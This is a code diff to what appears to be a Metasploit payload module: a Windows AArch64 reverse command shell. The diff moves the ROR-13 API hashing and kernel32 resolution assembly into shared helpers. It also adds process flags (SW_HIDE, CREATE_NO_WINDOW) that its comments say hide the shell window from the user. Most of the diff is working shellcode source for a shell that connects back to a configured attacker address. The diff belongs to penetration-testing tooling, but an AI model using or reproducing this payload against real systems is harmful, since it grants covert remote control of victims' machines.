@@ -9,6 +9,8 @@ module MetasploitModule
   CachedSize = 664
 
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::Aarch64
+  include Msf::Payload::Windows::Exitfunk_Aarch64
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
@@ -54,16 +56,11 @@ module MetasploitModule
     ip_lo_imm = ip_bytes[0, 2].unpack1('v')
     ip_hi_imm = ip_bytes[2, 2].unpack1('v')
 
-    # The exitfunk block re-resolves the chosen kernel32 exit API by hash
-    # at runtime; we patch the two MOVZ/MOVK immediates with the hash.
-    exit_hash = exitfunk_hash(datastore['EXITFUNC'])
-
     asm = build_asm(
       port_imm: port_imm,
       ip_lo_imm: ip_lo_imm,
       ip_hi_imm: ip_hi_imm,
-      exit_lo: exit_hash & 0xFFFF,
-      exit_hi: (exit_hash >> 16) & 0xFFFF
+      exitfunk: datastore['EXITFUNC']
     )
 
     compile_aarch64(asm)
@@ -71,39 +68,7 @@ module MetasploitModule
 
   private
 
-  # ROR-13 hash of a kernel32 export name, matching the asm find_function
-  # routine. The asm stops on CBZ before adding the NUL terminator, so we
-  # hash bytes only (no trailing zero).
-  #
-  # Sanity checks (verified against rev2.s constants):
-  #   ror13_hash('TerminateProcess') == 0x78b5b983
-  #   ror13_hash('LoadLibraryA')     == 0xec0e4e8e
-  #   ror13_hash('CreateProcessA')   == 0x16b3fe72
-  def ror13_hash(str)
-    h = 0
-    str.each_byte do |b|
-      h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
-      h = (h + b) & 0xFFFFFFFF
-    end
-    h
-  end
-
-  def exitfunk_hash(value)
-    case value.to_s.downcase
-    when 'thread'
-      ror13_hash('ExitThread')
-    when 'process', ''
-      0x78b5b983 # TerminateProcess (known constant; also == ror13_hash('TerminateProcess'))
-    when 'none'
-      # 'none' is best-effort here: we still need *something* to call so the
-      # shellcode doesn't fall off into garbage. ExitProcess is the safest.
-      ror13_hash('ExitProcess')
-    else
-      0x78b5b983
-    end
-  end
-
-  def build_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exit_lo:, exit_hi:)
+  def build_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exitfunk:)
     # Differences from the standalone rev2.s prototype:
     #   - `.text` / `.global` directives stripped (aarch64 gem rejects them)
     #   - `[reg, wreg, uxtw #N]` rewritten as `mov w15, w4; lsl x15, x15, #N;
@@ -119,86 +84,15 @@ module MetasploitModule
     # Gaps at 0x10 and 0x20 are intentional -- previously held cached
     # TerminateProcess (re-resolved by exitfunk now) and OpenProcessToken
     # (was unused dead code), preserved to keep slot offsets stable.
-    <<~ASM
+    asm = <<~ASM
       main:
         sub     sp, sp, #0x300
         mov     x29, sp
         add     x19, x29, #0x50
         add     x21, x29, #0x70
-
-      find_kernel32:
-        ldr     x6, [x18, #0x60]
-        ldr     x6, [x6,  #0x18]
-        ldr     x6, [x6,  #0x30]
-
-      next_module:
-        ldr     x3, [x6, #0x10]
-        ldr     x7, [x6, #0x40]
-        ldr     x6, [x6]
-        ldrh    w8, [x7, #24]
-        cbnz    w8, next_module
-
-      find_function_shorten:
-        b       find_function_shorten_bnc
-
-      find_function_ret:
-        str     x30, [x29, #0x08]
-        b       resolve_symbols_kernel32
-
-      find_function_shorten_bnc:
-        bl      find_function_ret
-
-      find_function:
-        mov     w10, w0
-        ldr     w8,  [x3, #0x3c]
-        add     x8,  x8, x3
-        ldr     w9,  [x8, #0x88]
-        add     x9,  x9, x3
-        ldr     w4,  [x9, #0x18]
-        ldr     w11, [x9, #0x20]
-        add     x11, x11, x3
-
-      find_function_loop:
-        cbz     w4, find_function_finished
-        sub     w4, w4, #1
-        mov     w15, w4
-        lsl     x15, x15, #2
-        add     x15, x11, x15
-        ldr     w12, [x15]
-        add     x6,  x12, x3
-
-      compute_hash:
-        mov     w5, wzr
-
-      compute_hash_again:
-        ldrb    w0, [x6], #1
-        cbz     w0, compute_hash_finished
-        ror     w5, w5, #13
-        add     w5, w5, w0
-        b       compute_hash_again
-
-      compute_hash_finished:
-      find_function_compare:
-        cmp     w5, w10
-        b.ne    find_function_loop
-
-        ldr     w12, [x9, #0x24]
-        add     x12, x12, x3
-        mov     w15, w4
-        lsl     x15, x15, #1
-        add     x15, x12, x15
-        ldrh    w4,  [x15]
-        ldr     w12, [x9, #0x1c]
-        add     x12, x12, x3
-        mov     w15, w4
-        lsl     x15, x15, #2
-        add     x15, x12, x15
-        ldr     w13, [x15]
-        add     x0,  x13, x3
-
-      find_function_finished:
-        ret
-
+    ASM
+    asm += asm_block_api_aarch64
+    asm += <<~ASM
       resolve_symbols_kernel32:
         str     x3, [x29, #0x00]
 
@@ -303,7 +197,8 @@ module MetasploitModule
 
         mov     w0, #0x68
         str     w0, [x11, #0x00]
-        mov     w0, #0x100
+        // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; wShowWindow stays 0 (SW_HIDE)
+        mov     w0, #0x101
         str     w0, [x11, #0x3C]
         str     x22, [x11, #0x50]
         str     x22, [x11, #0x58]
@@ -321,7 +216,8 @@ module MetasploitModule
         mov     x2, xzr
         mov     x3, xzr
         mov     w4, #1
-        mov     w5, wzr
+        // CREATE_NO_WINDOW — hides cmd/conhost on modern Windows (0x101 alone is not enough)
+        movz    w5, #0x0800, lsl #16
         mov     x6, xzr
         mov     x7, xzr
         stp     x11, x10, [sp]
@@ -330,29 +226,7 @@ module MetasploitModule
         blr     x9
 
         add     sp, sp, #0xB0
-
-      exitfunk:
-        ldr     x3, [x29, #0x00]
-        movz    w0, ##{format('0x%04x', exit_lo)}
-        movk    w0, ##{format('0x%04x', exit_hi)}, lsl #16
-        ldr     x9, [x29, #0x08]
-        blr     x9
-        mov     x10, x0
-        movn    x0, #0
-        mov     w1, wzr
-        blr     x10
-        brk     #0
     ASM
-  end
-
-  def compile_aarch64(asm_string)
-    require 'aarch64/parser'
-    parser = ::AArch64::Parser.new
-    asm = parser.parse(without_inline_comments(asm_string))
-    asm.to_binary
-  end
-
-  def without_inline_comments(string)
-    string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
+    asm + asm_exitfunk_aarch64(exitfunk: exitfunk)
   end
 end
